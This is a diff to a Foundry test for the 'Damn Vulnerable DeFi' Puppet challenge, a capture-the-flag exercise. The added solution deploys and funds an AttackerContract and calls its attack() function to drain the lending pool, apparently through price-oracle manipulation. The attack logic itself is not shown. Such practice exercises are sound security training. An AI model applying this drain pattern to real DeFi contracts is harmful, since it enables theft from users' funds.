@@ -4,7 +4,7 @@ pragma solidity =0.8.25;
 
 import {Test, console} from "forge-std/Test.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
-import {PuppetPool} from "../../src/puppet/PuppetPool.sol";
+import {PuppetPool, AttackerContract} from "../../src/puppet/PuppetPool.sol";
 import {IUniswapV1Exchange} from "../../src/puppet/IUniswapV1Exchange.sol";
 import {IUniswapV1Factory} from "../../src/puppet/IUniswapV1Factory.sol";
 
@@ -91,7 +91,13 @@ contract PuppetChallenge is Test {
     /**
      * CODE YOUR SOLUTION HERE
      */
-    function test_puppet() public checkSolvedByPlayer {}
+    function test_puppet() public checkSolvedByPlayer {
+        AttackerContract attacker = new AttackerContract(address(token), address(lendingPool), address(uniswapV1Exchange), recovery);
+        // Transfer DVT & ETH to attacker contract, so it was perform swap
+        token.transfer(address(attacker), PLAYER_INITIAL_TOKEN_BALANCE);
+        vm.deal(address(attacker), PLAYER_INITIAL_ETH_BALANCE);
+        attacker.attack();
+    }
 
     // Utility function to calculate Uniswap prices
     function _calculateTokenToEthInputPrice(uint256 tokensSold, uint256 tokensInReserve, uint256 etherInReserve)
